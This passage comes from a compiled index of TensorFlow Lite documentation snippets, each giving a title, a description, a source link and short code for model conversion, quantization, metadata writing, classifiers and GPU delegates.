  use_frameworks!
  pod 'TensorFlowLiteTaskText', '~> 0.4.4'
end
```

----------------------------------------

TITLE: Resizing Input Tensor Shape in TFLite Python
DESCRIPTION: Adjusts the shape of a specific input tensor before allocating tensors or invoking the model. This is necessary when the model has dynamic input shapes. The `strict` parameter controls whether only unknown dimensions (`-1`) can be resized.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/Interpreter.md#_snippet_15

LANGUAGE: python
CODE:
```
resize_tensor_input(
    input_index, tensor_size, strict=False
)
```

----------------------------------------

TITLE: Installing TFLite Support Pip Package for Python
DESCRIPTION: This shell command installs the tflite-support pip package, which provides the TensorFlow Lite Task Library APIs, including the AudioClassifier. Note that depending on the system, PortAudio may need to be installed separately if using the AudioRecord functionality.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/audio_classifier.md#_snippet_5

LANGUAGE: Shell
CODE:
```
pip install tflite-support
```

----------------------------------------

TITLE: Initializing MobileBert Classifier Spec in Python
DESCRIPTION: This snippet defines the constructor for the `MobileBertClassifierSpec` class in Python. It is used to configure parameters for a MobileBert model tailored for text classification tasks within the TFLite Model Maker library, such as specifying the TF-Hub URI, sequence length, learning rate, and distribution strategy. The arguments table following the snippet provides detailed explanations for each parameter.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/text_classifier/MobileBertClassifierSpec.md#_snippet_0

LANGUAGE: Python
CODE:
```
tflite_model_maker.text_classifier.MobileBertClassifierSpec(
    *,
    uri='https://tfhub.dev/google/mobilebert/uncased_L-24_H-128_B-512_A-4_F-4_OPT/1',
    model_dir=None,
    seq_len=128,
    dropout_rate=0.1,
    initializer_range=0.02,
    learning_rate=3e-05,
    distribution_strategy='off',
    num_gpus=-1,
    tpu='',
    trainable=True,
    do_lower_case=True,
    is_tf2=False,
    name='MobileBert',
    tflite_input_name=None,
    default_batch_size=48,
    index_to_label=None
)
```

----------------------------------------

TITLE: Creating Full Integer Quantization Config Python
DESCRIPTION: Creates a configuration object pre-set for full integer post-training quantization, including integer-only inference. It requires representative data for calibration and allows specifying calibration steps and target integer types (uint8 or int8) for inputs and outputs, along with supported operations for the target device.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/config/QuantizationConfig.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
for_int8(
    representative_data,
    quantization_steps=DEFAULT_QUANTIZATION_STEPS,
    inference_input_type=tf.uint8,
    inference_output_type=tf.uint8,
    supported_ops=tf.lite.OpsSet.TFLITE_BUILTINS_INT8
)
```

----------------------------------------

TITLE: Add TFLite GPU Dependency with Google Play Services
DESCRIPTION: Add the dependency for the TensorFlow Lite GPU delegate via Google Play services to your Android application's build.gradle file. This allows the app to utilize GPU acceleration through Google Play services.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/delegates/gpu_task.md#_snippet_0

LANGUAGE: Gradle
CODE:
```
dependencies {
  ...
  implementation 'com.google.android.gms:play-services-tflite-gpu:16.0.0'
}
```

----------------------------------------

TITLE: Running NLClassifier Inference C++
DESCRIPTION: Initializes the NLClassifier using options to set the model file path. It then shows how to perform classification on an input text string and obtain the results as a vector of core::Category objects.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/nl_classifier.md#_snippet_4

LANGUAGE: C++
CODE:
```
// Initialization
NLClassifierOptions options;
options.mutable_base_options()->mutable_model_file()->set_file_name(model_path);
std::unique_ptr<NLClassifier> classifier = NLClassifier::CreateFromOptions(options).value();

// Run inference with your input, `input_text`.
std::vector<core::Category> categories = classifier->Classify(input_text);
```

----------------------------------------

TITLE: Helper Functions for TFLite Object Detection Inference Python
DESCRIPTION: Defines Python helper functions (`preprocess_image`, `detect_objects`, `run_odt_and_draw_results`) and sets up necessary imports (`cv2`, `PIL`, `tf`, `np`). These functions are used for loading, preprocessing, running inference on, and visualizing results for a TFLite object detection model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_9

LANGUAGE: python
CODE:
```
#@title Load the trained TFLite model and define some visualization functions

import cv2

from PIL import Image

model_path = 'model.tflite'

# Load the labels into a list
classes = ['???'] * model.model_spec.config.num_classes
label_map = model.model_spec.config.label_map
for label_id, label_name in label_map.as_dict().items():
  classes[label_id-1] = label_name

# Define a list of colors for visualization
COLORS = np.random.randint(0, 255, size=(len(classes), 3), dtype=np.uint8)

def preprocess_image(image_path, input_size):
  """Preprocess the input image to feed to the TFLite model"""
  img = tf.io.read_file(image_path)
  img = tf.io.decode_image(img, channels=3)
  img = tf.image.convert_image_dtype(img, tf.uint8)
  original_image = img
  resized_img = tf.image.resize(img, input_size)
  resized_img = resized_img[tf.newaxis, :]
  resized_img = tf.cast(resized_img, dtype=tf.uint8)
  return resized_img, original_image


def detect_objects(interpreter, image, threshold):
  """Returns a list of detection results, each a dictionary of object info."""

  signature_fn = interpreter.get_signature_runner()

  # Feed the input image to the model
  output = signature_fn(images=image)

  # Get all outputs from the model
  count = int(np.squeeze(output['output_0']))
  scores = np.squeeze(output['output_1'])
  classes = np.squeeze(output['output_2'])
  boxes = np.squeeze(output['output_3'])

  results = []
  for i in range(count):
    if scores[i] >= threshold:
      result = {
        'bounding_box': boxes[i],
        'class_id': classes[i],
        'score': scores[i]
      }
      results.append(result)
  return results


def run_odt_and_draw_results(image_path, interpreter, threshold=0.5):
  """Run object detection on the input image and draw the detection results"""
  # Load the input shape required by the model
  _, input_height, input_width, _ = interpreter.get_input_details()[0]['shape']

  # Load the input image and preprocess it
  preprocessed_image, original_image = preprocess_image(
      image_path,
      (input_height, input_width)
    )

  # Run object detection on the input image
  results = detect_objects(interpreter, preprocessed_image, threshold=threshold)

  # Plot the detection results on the input image
  original_image_np = original_image.numpy().astype(np.uint8)
  for obj in results:
    # Convert the object bounding box from relative coordinates to absolute
    # coordinates based on the original image resolution
    ymin, xmin, ymax, xmax = obj['bounding_box']
    xmin = int(xmin * original_image_np.shape[1])
    xmax = int(xmax * original_image_np.shape[1])
    ymin = int(ymin * original_image_np.shape[0])
    ymax = int(ymax * original_image_np.shape[0])

    # Find the class index of the current object
    class_id = int(obj['class_id'])

    # Draw the bounding box and label on the image
    color = [int(c) for c in COLORS[class_id]]
    cv2.rectangle(original_image_np, (xmin, ymin), (xmax, ymax), color, 2)
    # Make adjustments to make the label visible for all objects
    y = ymin - 15 if ymin - 15 > 15 else ymin + 15
    label = "{}: {:.0f}%".format(classes[class_id], obj['score'] * 100)
    cv2.putText(original_image_np, label, (xmin, y),
        cv2.FONT_HERSHEY_SIMPLEX, 0.5, color, 2)

  # Return the final image
  original_uint8 = original_image_np.astype(np.uint8)
  return original_uint8
```

----------------------------------------

TITLE: Performing TensorFlow Lite Text Classification - Kotlin
DESCRIPTION: Defines the `classify` function that accepts input text, sets up a thread pool for asynchronous execution, performs inference using the appropriate initialized classifier (`bertClassifier` or `nlClassifier`), measures the time taken, and stores the results.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/text_classification.md#_snippet_8

LANGUAGE: Kotlin
CODE:
```
fun classify(text: String) {
  executor = ScheduledThreadPoolExecutor(1)

  executor.execute {
    val results: List<Category>
    // inferenceTime is the amount of time, in milliseconds, that it takes to
    // classify the input text.
    var inferenceTime = SystemClock.uptimeMillis()

    // Use the appropriate classifier based on the selected model
    if(currentModel == MOBILEBERT) {
      results = bertClassifier.classify(text)
    } else {
      results = nlClassifier.classify(text)
    }

    inferenceTime = SystemClock.uptimeMillis() - inferenceTime

    listener.onResult(results, inferenceTime)
  }
}
```

----------------------------------------

TITLE: Configuring MetalDelegate Options (Swift)
DESCRIPTION: Demonstrates how to configure `MetalDelegate.Options` explicitly by setting properties like precision loss, wait type, and quantization, and contrasts this with using the default initializer which achieves the same result with default options.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_5

LANGUAGE: Swift
CODE:
```
// THIS:
var options = MetalDelegate.Options()
options.isPrecisionLossAllowed = false
options.waitType = .passive
options.isQuantizationEnabled = true
let delegate = MetalDelegate(options: options)

// IS THE SAME AS THIS:
let delegate = MetalDelegate()
```

----------------------------------------

TITLE: Add Metadata for Image Classifier (Python)
DESCRIPTION: This code demonstrates how to create and populate metadata for a TFLite image classification model. It defines file paths and normalization parameters, loads the model and label file, creates an `ImageClassifierWriter` instance, populates the metadata, and saves the resulting model with embedded metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
ImageClassifierWriter = image_classifier.MetadataWriter
_MODEL_PATH = "mobilenet_v2_1.0_224.tflite"
# Task Library expects label files that are in the same format as the one below.
_LABEL_FILE = "mobilenet_labels.txt"
_SAVE_TO_PATH = "mobilenet_v2_1.0_224_metadata.tflite"
# Normalization parameters are required when reprocessing the image. It is
# optional if the image pixel values are in the range of [0, 255] and the input
# tensor is quantized to uint8. See the introduction for normalization and
# quantization parameters below for more details.
# https://www.tensorflow.org/lite/models/convert/metadata#normalization_and_quantization_parameters)
_INPUT_NORM_MEAN = 127.5
_INPUT_NORM_STD = 127.5

# Create the metadata writer.
writer = ImageClassifierWriter.create_for_inference(
    writer_utils.load_file(_MODEL_PATH), [_INPUT_NORM_MEAN], [_INPUT_NORM_STD],
    [_LABEL_FILE])

# Verify the metadata generated by the metadata writer.
print(writer.get_metadata_json())

# Populate the metadata into the model.
writer_utils.save_file(writer.populate(), _SAVE_TO_PATH)
```

----------------------------------------

TITLE: Converting JAX Model to TFLite via SavedModel/Concrete Functions (Python)
DESCRIPTION: Provides Python code demonstrating three methods to convert a JAX model to a TensorFlow Lite model. It uses Orbax Export to create a JaxModule, saves it as a TensorFlow SavedModel or gets a concrete function, and then uses the TFLiteConverter. Requires Orbax Export, TensorFlow, and JAX libraries. The output is a TFLite model in memory.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/jax_conversion/overview.md#_snippet_2

LANGUAGE: Python
CODE:
```
# This code snippet converts a JAX model to TFLite through TF SavedModel.
from orbax.export import ExportManager
from orbax.export import JaxModule
from orbax.export import ServingConfig
import tensorflow as tf
import jax.numpy as jnp

def model_fn(_, x):
  return jnp.sin(jnp.cos(x))

jax_module = JaxModule({}, model_fn, input_polymorphic_shape='b, ...')

# Option 1: Simply save the model via `tf.saved_model.save` if no need for pre/post
# processing.
tf.saved_model.save(
    jax_module,
    '/some/directory',
    signatures=jax_module.methods[JaxModule.DEFAULT_METHOD_KEY].get_concrete_function(
        tf.TensorSpec(shape=(None,), dtype=tf.float32, name="input")
    ),
    options=tf.saved_model.SaveOptions(experimental_custom_gradients=True),
)
converter = tf.lite.TFLiteConverter.from_saved_model('/some/directory')
tflite_model = converter.convert()

# Option 2: Define pre/post processing TF functions (e.g. (de)?tokenize).
serving_config = ServingConfig(
    'Serving_default',
    # Corresponds to the input signature of `tf_preprocessor`
    input_signature=[tf.TensorSpec(shape=(None,), dtype=tf.float32, name='input')],
    tf_preprocessor=lambda x: x,
    tf_postprocessor=lambda out: {'output': out}
)
export_mgr = ExportManager(jax_module, [serving_config])
export_mgr.save('/some/directory')
converter = tf.lite.TFLiteConverter.from_saved_model('/some/directory')
tflite_model = converter.convert()

# Option 3: Convert from TF concrete function directly
converter = tf.lite.TFLiteConverter.from_concrete_functions(
    [
        jax_module.methods[JaxModule.DEFAULT_METHOD_KEY].get_concrete_function(
            tf.TensorSpec(shape=(None,), dtype=tf.float32, name="input")
        )
    ]
)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Profiling Time by Name Scope (tfprof)
DESCRIPTION: This tfprof command profiles execution time aggregated by TensorFlow name scopes, which are often created using `tf.name_scope` or `tf.variable_scope`. It displays results up to a depth of 30, selects `micros` (execution time), filters to include only scopes with a minimum execution time of 100,000 microseconds (100ms), and orders results by total execution time. This helps pinpoint expensive sections of the graph structure defined by scopes.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/profiler/g3doc/profile_time.md#_snippet_7

LANGUAGE: tfprof
CODE:
```
tfprof> scope -max_depth 30 -select micros -min_micros 100000 -order_by micros
```

----------------------------------------

TITLE: Defining Trainable TensorFlow Lite Model Signatures (Python)
DESCRIPTION: Defines a Python class `Model` based on `tf.Module` containing a Keras sequential model. It implements custom `@tf.function` methods (`train`, `infer`, `save`, `restore`) with explicit input signatures, enabling these operations to be exposed as TFLite signatures for on-device training. The `train` method uses `tf.GradientTape` for backpropagation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/on_device_training/overview.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
IMG_SIZE = 28

class Model(tf.Module):

  def __init__(self):
    self.model = tf.keras.Sequential([
        tf.keras.layers.Flatten(input_shape=(IMG_SIZE, IMG_SIZE), name='flatten'),
        tf.keras.layers.Dense(128, activation='relu', name='dense_1'),
        tf.keras.layers.Dense(10, name='dense_2')
    ])

    self.model.compile(
        optimizer='sgd',
        loss=tf.keras.losses.CategoricalCrossentropy(from_logits=True))

  # The `train` function takes a batch of input images and labels.
  @tf.function(input_signature=[
      tf.TensorSpec([None, IMG_SIZE, IMG_SIZE], tf.float32),
      tf.TensorSpec([None, 10], tf.float32),
  ])
  def train(self, x, y):
    with tf.GradientTape() as tape:
      prediction = self.model(x)
      loss = self.model.loss(y, prediction)
    gradients = tape.gradient(loss, self.model.trainable_variables)
    self.model.optimizer.apply_gradients(
        zip(gradients, self.model.trainable_variables))
    result = {"loss": loss}
    return result

  @tf.function(input_signature=[
      tf.TensorSpec([None, IMG_SIZE, IMG_SIZE], tf.float32),
  ])
  def infer(self, x):
    logits = self.model(x)
    probabilities = tf.nn.softmax(logits, axis=-1)
    return {
        "output": probabilities,
        "logits": logits
    }

  @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
  def save(self, checkpoint_path):
    tensor_names = [weight.name for weight in self.model.weights]
    tensors_to_save = [weight.read_value() for weight in self.model.weights]
    tf.raw_ops.Save(
        filename=checkpoint_path, tensor_names=tensor_names,
        data=tensors_to_save, name='save')
    return {
        "checkpoint_path": checkpoint_path
    }

  @tf.function(input_signature=[tf.TensorSpec(shape=[], dtype=tf.string)])
  def restore(self, checkpoint_path):
    restored_tensors = {}
    for var in self.model.weights:
      restored = tf.raw_ops.Restore(
          file_pattern=checkpoint_path, tensor_name=var.name, dt=var.dtype,
          name='restore')
      var.assign(restored)
      restored_tensors[var.name] = restored
    return restored_tensors
```

----------------------------------------

TITLE: Initializing BertQuestionAnswerer Class - Python
DESCRIPTION: This is the constructor signature for the `BertQuestionAnswerer` class. It requires `BertQuestionAnswererOptions` and an internal C++ object for initialization.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/BertQuestionAnswerer.md#_snippet_0

LANGUAGE: python
CODE:
```
tflite_support.task.text.BertQuestionAnswerer(
    options: tflite_support.task.text.BertQuestionAnswererOptions,
    cpp_bert_question_answerer: _CppBertQuestionAnswerer
) -> None
```

----------------------------------------

TITLE: Retrieving TFLite Compatibility Log Python
DESCRIPTION: Shows how to access the results of the compatibility check performed by the `@compatible` decorator. The `<function_name>.get_compatibility_log()` method returns a list of strings detailing any detected compatibility warnings or errors, including the type of issue and its location within the function's graph.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/authoring.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
compatibility_log = '\n'.join(f.get_compatibility_log())
print (f"compatibility_log = {compatibility_log}")
```

----------------------------------------

TITLE: Creating and Populating NL Classifier Metadata (Python)
DESCRIPTION: Defines constants for the model path, label file, vocab file, the regex pattern for tokenization, and the save path for the output model. It then creates a `nl_classifier.MetadataWriter` using `create_for_inference`, passing the loaded model file, a `metadata_info.RegexTokenizerMd` object configured with the regex and vocab file, and the label file. The code proceeds to print the generated metadata JSON for verification and finally saves the model with the populated metadata.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/convert/metadata_writer_tutorial.ipynb#_snippet_14

LANGUAGE: Python
CODE:
```
NLClassifierWriter = nl_classifier.MetadataWriter
_MODEL_PATH = "movie_review.tflite"
# Task Library expects label files and vocab files that are in the same formats
# as the ones below.
_LABEL_FILE = "movie_review_labels.txt"
_VOCAB_FILE = "movie_review_vocab.txt"
# NLClassifier supports tokenize input string using the regex tokenizer. See
# more details about how to set up RegexTokenizer below:
# https://github.com/tensorflow/tflite-support/blob/master/tensorflow_lite_support/metadata/python/metadata_writers/metadata_info.py#L130
_DELIM_REGEX_PATTERN = r"[^\w\']+"
_SAVE_TO_PATH = "moview_review_metadata.tflite"

# Create the metadata writer.
writer = nl_classifier.MetadataWriter.create_for_inference(
    writer_utils.load_file(_MODEL_PATH),
    metadata_info.RegexTokenizerMd(_DELIM_REGEX_PATTERN, _VOCAB_FILE),
    [_LABEL_FILE])

# Verify the metadata generated by metadata writer.
print(writer.get_metadata_json())

# Populate the metadata into the model.
writer_utils.save_file(writer.populate(), _SAVE_TO_PATH)
```

----------------------------------------

TITLE: Creating Classifier Model for Retraining - Python TensorFlow
DESCRIPTION: Generates the underlying classifier model structure suitable for retraining within the TensorFlow Lite Model Maker framework. Accepts optional hyperparameters and a flag to include loss and metrics layers.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/ImageClassifier.md#_snippet_2

LANGUAGE: Python
CODE:
```
create_model(
    hparams=None, with_loss_and_metrics=False
)
```

----------------------------------------

TITLE: Training TensorFlow Object Detector Model Python
DESCRIPTION: Creates and trains the object detection model using `object_detector.create`. It takes the training data, model specification (`spec`), batch size (8), and validation data. Setting `train_whole_model=True` fine-tunes the entire model for potentially better accuracy.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_5

LANGUAGE: python
CODE:
```
model = object_detector.create(train_data, model_spec=spec, batch_size=8, train_whole_model=True, validation_data=validation_data)
```

----------------------------------------

TITLE: Performing Text Embedding - Python
DESCRIPTION: Performs feature vector extraction on the provided input text. It processes the text using the loaded model and returns the resulting embedding vectors.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/TextEmbedder.md#_snippet_3

LANGUAGE: python
CODE:
```
embed(
    text: str
) -> tflite_support.task.processor.EmbeddingResult
```

----------------------------------------

TITLE: Building AudioClassifier Options - Kotlin
DESCRIPTION: Constructs an `AudioClassifier.AudioClassifierOptions` object using its builder. This object is configured with settings such as the prediction score threshold, maximum number of results, and base options which can include delegate configurations for hardware acceleration.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/android/tutorials/audio_classification.md#_snippet_4

LANGUAGE: Kotlin
CODE:
```
val options = AudioClassifier.AudioClassifierOptions.builder()
  .setScoreThreshold(classificationThreshold)
  .setMaxResults(numOfResults)
  .setBaseOptions(baseOptionsBuilder.build())
  .build()
```

----------------------------------------

TITLE: Applying Experimental 16x8 Quantization (Float Fallback, Python)
DESCRIPTION: This snippet is similar to the previous 16x8 quantization but adds `tf.lite.OpsSet.TFLITE_BUILTINS` to the list of supported ops. This ensures that if an operator does not have an experimental 16x8 implementation, it will default to the standard TFLite built-in implementation (which might be float), preventing conversion errors but potentially resulting in a hybrid model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_quantization.md#_snippet_8

LANGUAGE: Python
CODE:
```
import tensorflow as tf
converter = tf.lite.TFLiteConverter.from_saved_model(saved_model_dir)
converter.representative_dataset = representative_dataset
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.target_spec.supported_ops = [tf.lite.OpsSet.EXPERIMENTAL_TFLITE_BUILTINS_ACTIVATIONS_INT16_WEIGHTS_INT8,
tf.lite.OpsSet.TFLITE_BUILTINS]
tflite_quant_model = converter.convert()
```

----------------------------------------

TITLE: Exporting TFLite with Custom Quantization - Python
DESCRIPTION: Exports the trained model to TensorFlow Lite format, applying the specified custom quantization configuration (`config`). This allows users to control the type of quantization applied during the conversion process.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/question_answer.ipynb#_snippet_17

LANGUAGE: python
CODE:
```
model.export(export_dir='.', tflite_filename='model_fp16.tflite', quantization_config=config)
```

----------------------------------------

TITLE: Loading and Preprocessing Data with Average Word Vec Spec in Python
DESCRIPTION: Loads training and test datasets from CSV files ('train.csv', 'dev.csv') using DataLoader.from_csv, applying the preprocessing required by the 'average_word_vec' model specification. 'sentence' is used as the text column and 'label' as the label column.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/text_classification.ipynb#_snippet_6

LANGUAGE: python
CODE:
```
train_data = DataLoader.from_csv(
      filename='train.csv',
      text_column='sentence',
      label_column='label',
      model_spec=spec,
      is_training=True)
test_data = DataLoader.from_csv(
      filename='dev.csv',
      text_column='sentence',
      label_column='label',
      model_spec=spec,
      is_training=False)
```

----------------------------------------

TITLE: Debugging Pose Detection with MoveNet (Python)
DESCRIPTION: Downloads a test image from a URL and performs pose detection using the `detect` function (assumed to be MoveNet or similar). It then draws the detected person's keypoints on the image. Useful for visually debugging the pose estimation step.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/tutorials/pose_classification.ipynb#_snippet_3

LANGUAGE: Python
CODE:
```
test_image_url = "https://cdn.pixabay.com/photo/2017/03/03/17/30/yoga-2114512_960_720.jpg" #@param {type:"string"}
!wget -O /tmp/image.jpeg {test_image_url}

if len(test_image_url):
  image = tf.io.read_file('/tmp/image.jpeg')
  image = tf.io.decode_jpeg(image)
  person = detect(image)
  _ = draw_prediction_on_image(image.numpy(), person, crop_region=None, 
                               close_figure=False, keep_input_size=True)
```

----------------------------------------

TITLE: Configuring GpuDelegate Options (C)
DESCRIPTION: Illustrates how to initialize and configure `TFLGpuDelegateOptions` using a struct literal in C, setting properties like precision loss, wait type, and quantization, and creating the delegate. It also shows the equivalent of creating the delegate with default options by passing `nullptr`.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/ios/delegates/gpu.md#_snippet_7

LANGUAGE: C
CODE:
```
// THIS:
const TFLGpuDelegateOptions options = {
  .allow_precision_loss = false,
  .wait_type = TFLGpuDelegateWaitType::TFLGpuDelegateWaitTypePassive,
  .enable_quantization = true,
};

TfLiteDelegate* delegate = TFLGpuDelegateCreate(options);

// IS THE SAME AS THIS:
TfLiteDelegate* delegate = TFLGpuDelegateCreate(nullptr);
```

----------------------------------------

TITLE: Load Data in PASCAL VOC Format - Python (Model Maker)
DESCRIPTION: This snippet demonstrates how to load an object detection dataset using the TensorFlow Lite Model Maker library when the data is organized in the PASCAL VOC format. It requires specifying the directory containing images and the directory with corresponding XML annotation files.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/models/modify/model_maker/object_detection.ipynb#_snippet_14

LANGUAGE: python
CODE:
```
object_detector.DataLoader.from_pascal_voc(image_dir, annotations_dir, label_map={1: "person", 2: "notperson"})
```

----------------------------------------

TITLE: Initialize and Run Image Searcher C++
DESCRIPTION: Provides C++ code for initializing the TensorFlow Lite ImageSearcher. It demonstrates setting model file path and L2 normalization options, creating the searcher, preparing an input FrameBuffer from raw image data, and executing the search operation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/inference_with_metadata/task_library/image_searcher.md#_snippet_2

LANGUAGE: C++
CODE:
```
// Initialization
ImageSearcherOptions options;
options.mutable_base_options()->mutable_model_file()->set_file_name(model_path);
options.mutable_embedding_options()->set_l2_normalize(true);
std::unique_ptr<ImageSearcher> image_searcher = ImageSearcher::CreateFromOptions(options).value();

// Create input frame_buffer from your inputs, `image_data` and `image_dimension`.
// See more information here: tensorflow_lite_support/cc/task/vision/utils/frame_buffer_common_utils.h
std::unique_ptr<FrameBuffer> frame_buffer = CreateFromRgbRawBuffer(
      image_data, image_dimension);

// Run inference
const SearchResult result = image_searcher->Search(*frame_buffer).value();
```

----------------------------------------

TITLE: Adding Select TF Ops CocoaPod Dependency - Ruby (Podfile)
DESCRIPTION: This Ruby snippet for a Podfile shows how to add the `TensorFlowLiteSelectTfOps` CocoaPod dependency, which provides the necessary library for supporting select TensorFlow operations in a TensorFlow Lite model on iOS.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/guide/ops_select.md#_snippet_6

LANGUAGE: ruby
CODE:
```
# In your Podfile target:
  pod 'TensorFlowLiteSwift'   # or 'TensorFlowLiteObjC'
  pod 'TensorFlowLiteSelectTfOps', '~> 0.0.1-nightly'
```

----------------------------------------

TITLE: Run TensorFlow Lite Quantization Debugger Python
DESCRIPTION: Executes the core debugging process by calling the `run()` method on the initialized debugger object. This performs the analysis across the provided dataset and collects tensor error statistics.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/quantization_debugger.ipynb#_snippet_7

LANGUAGE: Python
CODE:
```
debugger.run()
```

----------------------------------------

TITLE: Creating NLClassifier from Options in Python
DESCRIPTION: Documents the `create_from_options` class method for the `NLClassifier`. This method takes an `NLClassifierOptions` object containing configuration details. It initializes and returns a new `NLClassifier` object based on the provided options. It may raise `ValueError` or `RuntimeError` if the options are invalid or an error occurs.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_support/task/text/NLClassifier.md#_snippet_3

LANGUAGE: python
CODE:
```
@classmethod
create_from_options(
    options: tflite_support.task.text.NLClassifierOptions
) -> 'NLClassifier'
```

----------------------------------------

TITLE: Generating Dataset with Batching and Shuffling (gen_dataset) - Python
DESCRIPTION: Generates a shared and batched tf.data.Dataset suitable for training or evaluation. It supports batching, shuffling, repeating for training, distributing across workers, preprocessing, and dropping incomplete batches.

Args:
  batch_size: A integer, the returned dataset will be batched by this size.
  is_training: A boolean, when True, the returned dataset will be optionally shuffled and repeated as an endless dataset.
  shuffle: A boolean, when True, the returned dataset will be shuffled to create randomness during model training.
  input_pipeline_context: A InputContext instance, used to shared dataset among multiple workers when distribution strategy is used.
  preprocess: A function taking three arguments in order, feature, label and boolean is_training.
  drop_remainder: boolean, whether the final batch drops remainder.

Returns:
  A TF dataset ready to be consumed by Keras model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tflite_model_maker/image_classifier/DataLoader.md#_snippet_3

LANGUAGE: python
CODE:
```
gen_dataset(
    batch_size=1,
    is_training=False,
    shuffle=False,
    input_pipeline_context=None,
    preprocess=None,
    drop_remainder=False
)
```

----------------------------------------

TITLE: Converting Keras Model with Float Fallback Quantization TFLite Python
DESCRIPTION: Defines a generator function `representative_data_gen` to provide sample inputs for calibration. Initializes the converter, sets default optimizations, and assigns the generator to `representative_dataset`. This converts weights and intermediate activations to 8-bit integers, but the model inputs/outputs remain float by default.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/performance/post_training_integer_quant.ipynb#_snippet_4

LANGUAGE: python
CODE:
```
def representative_data_gen():
  for input_value in tf.data.Dataset.from_tensor_slices(train_images).batch(1).take(100):
    # Model has only one input so each data point has one element.
    yield [input_value]

converter = tf.lite.TFLiteConverter.from_keras_model(model)
converter.optimizations = [tf.lite.Optimize.DEFAULT]
converter.representative_dataset = representative_data_gen

tflite_model_quant = converter.convert()
```

----------------------------------------

TITLE: Importing Core Libraries Python
DESCRIPTION: This code block imports the necessary Python libraries: Keras for model definition and usage, TensorFlow for TFLite conversion and interpretation, and NumPy for numerical operations, especially array manipulation.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/examples/keras/keras_jax_backend_to_tfl.ipynb#_snippet_1

LANGUAGE: python
CODE:
```
import keras
import tensorflow as tf
import numpy as np
```

----------------------------------------

TITLE: Converting Keras Model to TFLite Python
DESCRIPTION: Shows how to create a TFLiteConverter from a tf.Keras model object and perform the conversion to a TensorFlow Lite model.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/lite/g3doc/api_docs/python/tf/lite/TFLiteConverter.md#_snippet_2

LANGUAGE: python
CODE:
```
# Converting a tf.Keras model to a TensorFlow Lite model.
converter = tf.lite.TFLiteConverter.from_keras_model(model)
tflite_model = converter.convert()
```

----------------------------------------

TITLE: Using tf.function with Default AutoGraph Conversion Python
DESCRIPTION: Shows how the `tf.function` API implicitly uses AutoGraph to convert a Python function before tracing it into a TensorFlow graph. This is the standard way AutoGraph is used in TensorFlow 2.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/autograph/g3doc/reference/intro.md#_snippet_1

LANGUAGE: Python
CODE:
```
def f(...):
  ...

graph_f = tf.function(f)
```

----------------------------------------

TITLE: Reading and Decoding Text File - Python
DESCRIPTION: This code reads the content of the downloaded text file in binary mode and then decodes it using UTF-8 encoding. The decoded text is stored in the 'text' variable for subsequent processing.
SOURCE: https://github.com/tensorflow/tensorflow/blob/master/tensorflow/python/ops/numpy_ops/g3doc/TensorFlow_NumPy_Text_Generation.ipynb#_snippet_3

